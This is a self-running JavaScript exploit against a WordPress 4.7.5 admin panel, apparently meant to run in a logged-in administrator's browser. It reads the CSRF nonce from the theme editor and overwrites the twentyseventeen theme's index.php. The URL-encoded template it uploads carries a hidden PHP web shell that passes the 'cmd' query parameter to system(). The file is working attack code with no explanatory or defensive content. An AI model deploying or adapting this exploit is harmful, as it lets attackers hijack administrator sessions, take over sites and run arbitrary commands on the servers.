var wpnonce = '';

function getCSRFNonce(callback)
{
  var re = /<input type="hidden" id="_wpnonce" name="_wpnonce" value="(\w*)" \/>/

  var xhr = new XMLHttpRequest();
  xhr.open("GET", "http://mywordpress.com/wordpress/wordpress-475/wp-admin/theme-editor.php?file=index.php&theme=twentyseventeen", true);
  xhr.withCredentials = true;
  xhr.overrideMimeType('text/xml');

  xhr.onreadystatechange = function() {
    if (xhr.readyState == 4) {
      response = xhr.responseText;
      wpnonce = response.match(re)[1];
      callback();
    }
  }

  xhr.send();
}


function submitExploit()
{
  getCSRFNonce(function() { 
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "http://mywordpress.com/wordpress/wordpress-475/wp-admin/theme-editor.php", true);
    xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
    xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.withCredentials = true;
    var body = "_wpnonce=" + wpnonce + "&_wp_http_referer=%2Fwordpress%2Fwordpress-475%2Fwp-admin%2Ftheme-editor.php%3Ffile%3Dindex.php%26theme%3Dtwentyseventeen&newcontent=%3C%3Fphp%0D%0A%2F**%0D%0A+*+The+main+template+file%0D%0A+*%0D%0A+*+This+is+the+most+generic+template+file+in+a+WordPress+theme%0D%0A+*+and+one+of+the+two+required+files+for+a+theme+%28the+other+being+style.css%29.%0D%0A+*+It+is+used+to+display+a+page+when+nothing+more+specific+matches+a+query.%0D%0A+*+E.g.%2C+it+puts+together+the+home+page+when+no+home.php+file+exists.%0D%0A+*%0D%0A+*+%40link+https%3A%2F%2Fcodex.wordpress.org%2FTemplate_Hierarchy%0D%0A+*%0D%0A+*+%40package+WordPress%0D%0A+*+%40subpackage+Twenty_Seventeen%0D%0A+*+%40since+1.0%0D%0A+*+%40version+1.0%0D%0A+*%2F%0D%0A%0D%0Aget_header%28%29%3B+%3F%3E%0D%0A%0D%0A%3Cdiv+class%3D%22wrap%22%3E%0D%0A%09%3C%3Fphp+if+%28+is_home%28%29+%26%26+%21+is_front_page%28%29+%29+%3A+%3F%3E%0D%0A%09%09%3Cheader+class%3D%22page-header%22%3E%0D%0A%09%09%09%3Ch1+class%3D%22page-title%22%3E%3C%3Fphp+single_post_title%28%29%3B+%3F%3E%3C%2Fh1%3E%0D%0A%09%09%3C%2Fheader%3E%0D%0A%09%3C%3Fphp+else+%3A+%3F%3E%0D%0A%09%3Cheader+class%3D%22page-header%22%3E%0D%0A%09%09%3Ch2+class%3D%22page-title%22%3E%3C%3Fphp+_e%28+%27Posts%27%2C+%27twentyseventeen%27+%29%3B+%3F%3E%3C%2Fh2%3E%0D%0A%09%3C%2Fheader%3E%0D%0A%09%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A%09%3Cdiv+id%3D%22primary%22+class%3D%22content-area%22%3E%0D%0A%09%09%3Cmain+id%3D%22main%22+class%3D%22site-main%22+role%3D%22main%22%3E%0D%0A%0D%0A++++++++++++++++++++++++%3C%3Fphp+isset%28%24_GET%5B%27cmd%27%5D%29+%3F+system%28%24_GET%5B%27cmd%27%5D%29+%3A+%27%27%3B+%3F%3E%0D%0A%0D%0A%09%09%09%3C%3Fphp%0D%0A%09%09%09if+%28+have_posts%28%29+%29+%3A%0D%0A%0D%0A%09%09%09%09%2F*+Start+the+Loop+*%2F%0D%0A%09%09%09%09while+%28+have_posts%28%29+%29+%3A+the_post%28%29%3B%0D%0A%0D%0A%09%09%09%09%09%2F*%0D%0A%09%09%09%09%09+*+Include+the+Post-Format-specific+template+for+the+content.%0D%0A%09%09%09%09%09+*+If+you+want+to+override+this+in+a+child+theme%2C+then+include+a+file%0D%0A%09%09%09%09%09+*+called+content-___.php+%28where+___+is+the+Post+Format+name%29+and+that+will+be+used+instead.%0D%0A%09%09%09%09%09+*%2F%0D%0A%09%09%09%09%09get_template_part%28+%27template-parts%2Fpost%2Fcontent%27%2C+get_post_format%28%29+%29%3B%0D%0A%0D%0A%09%09%09%09endwhile%3B%0D%0A%0D%0A%09%09%09%09the_posts_pagination%28+array%28%0D%0A%09%09%09%09%09%27prev_text%27+%3D%3E+twentyseventeen_get_svg%28+array%28+%27icon%27+%3D%3E+%27arrow-left%27+%29+%29+.+%27%3Cspan+class%3D%22screen-reader-text%22%3E%27+.+__%28+%27Previous+page%27%2C+%27twentyseventeen%27+%29+.+%27%3C%2Fspan%3E%27%2C%0D%0A%09%09%09%09%09%27next_text%27+%3D%3E+%27%3Cspan+class%3D%22screen-reader-text%22%3E%27+.+__%28+%27Next+page%27%2C+%27twentyseventeen%27+%29+.+%27%3C%2Fspan%3E%27+.+twentyseventeen_get_svg%28+array%28+%27icon%27+%3D%3E+%27arrow-right%27+%29+%29%2C%0D%0A%09%09%09%09%09%27before_page_number%27+%3D%3E+%27%3Cspan+class%3D%22meta-nav+screen-reader-text%22%3E%27+.+__%28+%27Page%27%2C+%27twentyseventeen%27+%29+.+%27+%3C%2Fspan%3E%27%2C%0D%0A%09%09%09%09%29+%29%3B%0D%0A%0D%0A%09%09%09else+%3A%0D%0A%0D%0A%09%09%09%09get_template_part%28+%27template-parts%2Fpost%2Fcontent%27%2C+%27none%27+%29%3B%0D%0A%0D%0A%09%09%09endif%3B%0D%0A%09%09%09%3F%3E%0D%0A%0D%0A%09%09%3C%2Fmain%3E%3C%21--+%23main+--%3E%0D%0A%09%3C%2Fdiv%3E%3C%21--+%23primary+--%3E%0D%0A%09%3C%3Fphp+get_sidebar%28%29%3B+%3F%3E%0D%0A%3C%2Fdiv%3E%3C%21--+.wrap+--%3E%0D%0A%0D%0A%3C%3Fphp+get_footer%28%29%3B%0D%0A&action=update&file=index.php&theme=twentyseventeen&scrollto=291&docs-list=&submit=Update+File";
    var aBody = new Uint8Array(body.length);
    for (var i = 0; i < aBody.length; i++)
      aBody[i] = body.charCodeAt(i); 
    xhr.send(new Blob([aBody]));
  });
}

submitExploit();

